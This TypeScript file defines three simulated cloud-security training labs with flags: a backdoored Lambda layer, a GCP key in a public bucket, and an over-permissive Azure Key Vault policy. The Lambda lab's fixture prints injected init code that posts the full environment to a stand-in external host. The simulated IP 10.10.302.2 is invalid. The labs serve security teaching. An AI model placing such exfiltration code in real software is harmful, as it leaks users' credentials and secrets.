import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

/** Batch 20, part 2b: Cloud (Lambda Layers backdoor, exposed GCP service account key, overly permissive
 *  Azure Key Vault access policy). Written from established high-confidence knowledge -- WebSearch was
 *  unavailable for this batch (see NOTES.md batch 20). */
export const batch20CloudLabs: LabScenario[] = [
  // 1 — AWS Lambda Layers Backdoor
  {
    id: 'cloud-aws-lambda-layer-backdoor',
    title: 'Cloud: A Malicious AWS Lambda Layer Backdoors Every Attached Function',
    difficulty: 'Medium',
    category: 'Cloud',
    briefing:
      'Lambda Layers let teams share common code/dependencies across many functions without bundling that ' +
      'code into every deployment package individually -- a real, standard AWS feature. A compromised CI ' +
      'credential was used to publish a new version of the "shared-logging-utils" layer, attached to over a ' +
      'dozen production functions, with one addition never mentioned in any code review: an extra outbound ' +
      'HTTPS call in the layer\'s own initialization code, executed automatically the moment any attached ' +
      'function cold-starts, exfiltrating that function\'s entire environment variable set -- API keys, ' +
      'database credentials, everything -- to an attacker-controlled endpoint before the function\'s own ' +
      'handler code ever runs a single line.',
    objectives: [
      { text: 'cat lambda-layer-version-diff.txt', why: 'Confirms the exact injected code: an outbound HTTPS call added to the layer\'s initialization path, never present in any reviewed version, executed automatically on every cold start of every function that attaches this layer.' },
      { text: 'cat attached-functions-blast-radius.txt', why: 'Confirms the real scope of impact -- a single compromised shared layer backdoors every function that attaches it, not just one isolated function, since the layer\'s init code runs inside each function\'s own execution environment.' },
    ],
    hints: [
      'cat lambda-layer-version-diff.txt',
      'cat attached-functions-blast-radius.txt',
    ],
    totalFlags: 1,
    attacker: attacker({
      'lambda-layer-version-diff.txt': file(
        'Diff, shared-logging-utils Lambda Layer, version 12 -> version 13 (published via compromised CI credential):\n' +
          '+ import https from "https";\n' +
          '+ https.request({ hostname: "telemetry-collect.net", path: "/ingest", method: "POST" })\n' +
          '+   .end(JSON.stringify(process.env));   // exfiltrates the ENTIRE environment variable set\n' +
          '  exports.initLogger = () => { ... }      // the layer\'s real, documented purpose -- unchanged\n' +
          '-- the exfil call runs inside the layer\'s own module-scope initialization code, which executes\n' +
          '   automatically on cold start, before the attached function\'s own handler code runs at all --\n',
      ),
      'attached-functions-blast-radius.txt': file(
        'Functions with shared-logging-utils v13 attached (AWS Lambda console export):\n' +
          '  payments-processor, user-auth-svc, order-fulfillment, inventory-sync, notification-dispatch,\n' +
          '  + 9 more functions across 3 production accounts\n' +
          '  -- a single compromised shared layer backdoors every function that attaches it -- the exfil code\n' +
          '     runs inside EACH function\'s own execution environment and its own real environment variables --\n' +
          '  flag{lambda_layer_backdoor_shared_dependency_exfil_env_vars}\n',
      ),
    }),
    network: [],
  },

  // 2 — GCP Service Account JSON Key Exposed via a Public GCS Bucket
  {
    id: 'cloud-gcp-service-account-key-public-gcs-bucket',
    title: 'Cloud: A GCP Service Account JSON Key Sits in a Public GCS Bucket',
    difficulty: 'Easy',
    category: 'Cloud',
    briefing:
      'A CI pipeline\'s deployment artifacts bucket, gs://meridian-ci-artifacts, was configured with ' +
      'allUsers granted the Storage Object Viewer role during initial setup -- meant to let a partner\'s ' +
      'build system download compiled release binaries, and never scoped down afterward. Sitting alongside ' +
      'those binaries, uploaded by an engineer\'s local deployment script and forgotten, is a service account ' +
      'JSON key file -- GCP\'s long-lived, downloadable credential format, functionally equivalent to an AWS ' +
      'access key pair. Anyone who can list the bucket can download it directly, with no authentication of ' +
      'their own at all.',
    objectives: [
      { text: 'curl https://10.10.302.2:443/meridian-ci-artifacts/', why: 'allUsers Storage Object Viewer means this bucket listing requires no credentials at all -- confirms the bucket really is public before looking for anything sensitive inside it.' },
      { text: 'curl https://10.10.302.2:443/meridian-ci-artifacts/deploy-sa-key.json', why: 'A GCP service account JSON key is a real, long-lived, directly-usable credential -- downloading it from a public bucket is functionally identical to finding an AWS access key pair in a public S3 bucket.' },
    ],
    hints: [
      'curl https://10.10.302.2:443/meridian-ci-artifacts/',
      'curl https://10.10.302.2:443/meridian-ci-artifacts/deploy-sa-key.json',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'storage-googleapis-sim',
        ip: '10.10.302.2',
        os: 'Google Cloud Storage (allUsers: Storage Object Viewer on meridian-ci-artifacts)',
        services: [
          {
            port: 443,
            name: 'https',
            version: 'GCS bucket (public read via allUsers)',
            http: {
              '/meridian-ci-artifacts/': '["release-v4.2.1.tar.gz","release-v4.2.0.tar.gz","deploy-sa-key.json"]',
              '/meridian-ci-artifacts/deploy-sa-key.json':
                '{"type":"service_account","project_id":"meridian-prod","private_key_id":"9f2a7c41e8b0d3f5",' +
                '"client_email":"ci-deployer@meridian-prod.iam.gserviceaccount.com",' +
                '"note":"flag{gcp_service_account_key_exposed_public_gcs_bucket_allusers}"}',
            },
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 3 — Azure Key Vault Overly Permissive Access Policy
  {
    id: 'cloud-azure-keyvault-overly-permissive-access-policy',
    title: 'Cloud: An Overly Permissive Azure Key Vault Access Policy Exposes Every Secret',
    difficulty: 'Medium',
    category: 'Cloud',
    briefing:
      'meridian-prod-kv01 uses Key Vault\'s legacy Access Policies model (rather than the newer, more ' +
      'granular Azure RBAC integration), and one policy entry grants an entire Azure AD group -- ' +
      '"all-engineering," roughly 140 people -- full Get/List/Set/Delete rights over every secret, key, and ' +
      'certificate in the vault, including production database connection strings and third-party API keys ' +
      'no individual engineer\'s day-to-day work should ever require touching directly. Legacy access ' +
      'policies apply vault-wide with no per-secret scoping at all, unlike RBAC role assignments which can ' +
      'be scoped to individual secrets -- a real, documented limitation of the older model that makes ' +
      '"convenient for the whole team" and "every compromised engineering account can read every production ' +
      'secret" the exact same configuration.',
    objectives: [
      { text: 'cat keyvault-access-policy-export.txt', why: 'Confirms the "all-engineering" AD group -- roughly 140 accounts -- holds full Get/List/Set/Delete rights over every secret in the vault, via Key Vault\'s legacy access-policy model, which has no per-secret scoping at all.' },
      { text: 'cat compromised-engineer-secret-list.txt', why: 'Confirms the concrete impact from a single compromised engineering account: full read access to production database connection strings and third-party API keys, not a theoretical over-broad grant.' },
    ],
    hints: [
      'cat keyvault-access-policy-export.txt',
      'cat compromised-engineer-secret-list.txt',
    ],
    totalFlags: 1,
    attacker: attacker({
      'keyvault-access-policy-export.txt': file(
        'az keyvault show --name meridian-prod-kv01 (access policies):\n' +
          '  Object: all-engineering (Azure AD group, ~140 members)\n' +
          '  Permissions: Secrets [Get, List, Set, Delete], Keys [Get, List], Certificates [Get, List]\n' +
          '  -- legacy Access Policies model: this grant applies VAULT-WIDE, no per-secret scoping exists at\n' +
          '     all in this model, unlike the newer Azure RBAC integration which can scope to individual secrets --\n',
      ),
      'compromised-engineer-secret-list.txt': file(
        'az keyvault secret list --vault-name meridian-prod-kv01 (using a compromised engineering account):\n' +
          '  prod-db-connection-string\n' +
          '  stripe-api-secret-key\n' +
          '  sendgrid-api-key\n' +
          '  jwt-signing-secret\n' +
          '  -- a single compromised account from a 140-person group reads every production secret in the\n' +
          '     vault directly, with no additional privilege escalation needed at all --\n' +
          '  flag{azure_keyvault_legacy_access_policy_vault_wide_overpermissioned}\n',
      ),
    }),
    network: [],
  },
];
